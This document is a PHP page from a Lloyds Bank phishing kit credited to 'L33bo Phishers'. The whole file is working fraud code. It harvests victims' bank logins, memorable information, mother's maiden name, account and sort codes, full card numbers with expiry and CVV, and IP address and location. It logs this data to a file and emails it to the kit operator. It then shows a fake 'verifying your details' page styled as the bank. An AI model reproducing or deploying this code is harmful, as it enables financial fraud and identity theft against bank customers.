<?php 
/*
L33bo phishers = ICQ: 695059760
*/
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/enc.php";
require "../../CONTROLS.php";
date_default_timezone_set('Europe/London');
$date = date('l d F Y');
$time = date('H:i');
$user = $_SESSION['user'];
$pass = $_SESSION['pass2'];
$memo = $_SESSION['memo'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
if(!isset($_POST['telephone'])) {
$telephone = '';
}      
else $telephone = $_POST['telephone'];
$mobile = $_POST['mobile'];
$mmn = $_POST['mmn'];
$acno = $_POST['acno'];
$sortcode = $_POST['sortcode'];
$ccno = $_POST['ccno'];
$ccexp = $_POST['ccexp'];
$secode = $_POST['secode'];
if(!isset($_POST['telepin'])) {
$telepin = '';
}      
else $telepin = $_POST['telepin'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$ccno = str_replace(' ', '', $ccno);
$cardInfo = bankDetails($ccno);
$BIN = ($cardInfo['bin']);
$Bank = ($cardInfo['bank']);
$Brand = ($cardInfo['brand']);
$Type = ($cardInfo['card_type']);
$category = ($cardInfo['card_category']);
$VictimInfo1 = "| IP Address :"." ".$_SERVER['REMOTE_ADDR']." (".gethostbyaddr($_SERVER['REMOTE_ADDR']).")";
$VictimInfo2 = "| Location :"." ".$systemInfo['city'].", ".$systemInfo['region'].", ".$systemInfo['country'];
$VictimInfo3 = "| UserAgent :"." ".$systemInfo['useragent'];
$VictimInfo4 = "| Browser :"." ".$systemInfo['browser'];
$VictimInfo5 = "| Platform :"." ".$systemInfo['os'];
$from = $From_Address;
$headers = "From:" . $from;
$subj = "L00y : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language, this user has been redirected to the official site and is now bloacked from accessing this page.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$data = "
+ ------------- l33bo Phishers -------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Home Tel : $telephone
| Mobile Tel : $mobile
| Mother Maiden : $mmn
+ ------------------------------------------+
+ Account Information
| User : $user
| Pass : $pass
| Memorable Info : $memo
| 6-digit Security Code: $telepin
| Account No: $acno
| Sortcode: $sortcode
+ ------------------------------------------+
+ Billing Information
| Card BIN : $BIN
| Card Bank : $Bank
| Card Type : $Brand $Type
| Card Number : $ccno
| Expiration date : $ccexp
| CVV : $secode
+ ------------------------------------------+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------------------------------------------+
";
if($Encrypt==1) {
include("assets/includes/AES.php");
$imputText = $data;
$imputKey = "232BBCD7D47A1192";
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
}
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
	if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.jp/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwiiz86irc3KAhVGHqYKHTY2D_8QjBAIIjAB&url=http%3A%2F%2Fwww.lloydsbank.com%2Fonline-banking%2Finternet-banking.asp&usg=AFQjCNFh5kHG2Uy63mX1tK0qLGqiNjQBMQ"));
    }
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.co.jp/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwiiz86irc3KAhVGHqYKHTY2D_8QjBAIIjAB&url=http%3A%2F%2Fwww.lloydsbank.com%2Fonline-banking%2Finternet-banking.asp&usg=AFQjCNFh5kHG2Uy63mX1tK0qLGqiNjQBMQ"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/lloyds.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/lloyds.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
require "../../assets/includes/vpn_check.php";
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<link href="assets/img/001.ico" type="image/x-icon" rel="icon" />
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Complete</title>
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/img/001.jpg" rel="apple-touch-icon" sizes="57x57">
<link href="assets/img/002.jpg" rel="apple-touch-icon" sizes="114x114">
<link href="assets/css/l33bo.css" rel="stylesheet" type="text/css">
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />
</head>
<body class="hasJS">
<div id="outer">
<div id="banner">
<header class="clearfix">
<div class="header-inner clearfix">
<p id="logo"><img src="assets/img/logo.gif"></p>
<p id="userStatus"><img id="ngbHeader:lnkpadlockSeclogin1NGB" src="assets/img/001.png"></p>
<a class="toggle-header" href="javascript:void(0);" id="ngbHeader:toggle-header" name="ngbHeader:toggle-header">Show user menu</a></div>
<div class="four-col" id="user-menu"><span class="name"></span>
<ul class="clearfix">
<li class="details"><a class="linkBullet" href="#" id="ngbHeader:lnkChangeDetailsNGB" name="ngbHeader:lnkChangeDetailsNGB"><span>Change details</span></a></li>
<li class="moreInfo"><a class="linkBullet" href="#" id="ngbHeader:lnkSecurityNGB" name="ngbHeader:lnkSecurityNGB"><span>Security</span></a></li>
<li class="cookie"><a class="linkBullet" href="#" id="ngbHeader:ePrivacyLoggedInNGB" name="ngbHeader:ePrivacyLoggedInNGB"><span>Cookie policy</span></a></li>
<li class="logout"><a class="linkBullet" href="Login.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" id="ngbHeader:lnkLogoutNGB" name="ngbHeader:lnkLogoutNGB" title="Log out">Log out</a></li>
</ul>
</div>
</header>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Please wait while we check your information</h1>
<div id="indicator">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="panel">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="panelInner">
<div class="inner">
<center><a id="loadingIcon" name="loadingIcon" href="#"><img src="assets/img/004.gif" /></a></center>
<br>
<p align="center">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
<p align="center">Please don't refresh this page or close your browser while you're waiting.</p>
<p align="center">You will be redirected to our homepage when were done verifying your details</p>
</div>
</div>
</div>
</div>
</div>
<div class="nav">
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
</div>
</div>
</div>
</div>
</div>
<div class="lnkLev2">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="../Loginmb.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" id="help" name="help">Go to desktop site</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="help" name="help">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#" id="lnkcontactus" name="lnkcontactus">Contact us</a></p>
</div>
</div>
<div id="logout">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="logoutInner">
<p class="msg">You are securely logged in</p>
<div class="lnkLev1">
<div class="lnkTL">
<div class="lnkTR">
<div class="lnkBR">
<div class="lnkBL">
<p class="lnkLev1P"><a class="blockLink" href="Login.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" id="lnkLogout" name="lnkLogout" title="Log out">Log out</a></p>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<span id="txtUsername" style="display:none">+00494521548</span>
<div class="footerLinks">
<a class="newwin" href="#" id="footerngb:cndauthenvironngb:Legalid" name="footerngb:cndauthenvironngb:Legalid">Legal</a>
<a class="newwin" href="#" id="footerngb:cndauthenvironngb:privacyid" name="footerngb:cndauthenvironngb:privacyid" target="_blank">Privacy</a>
<a class="newwin" href="#" id="footerngb:cndauthenvironngb:Ratesandchargesngb" name="footerngb:cndauthenvironngb:Ratesandchargesngb" target="_blank">Rates &amp; Charges</a>
<a class="newwin" href="#" id="footerngb:cndauthenvironngb:weblink" name="footerngb:cndauthenvironngb:weblink" target="_blank">www.lloydsbank.com</a></div>
<span id="mLogonSuccess" style="display:none"></span> 
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
Created by ::: L33bo-Phisers ==  icq ::: 695059760 
*/
?>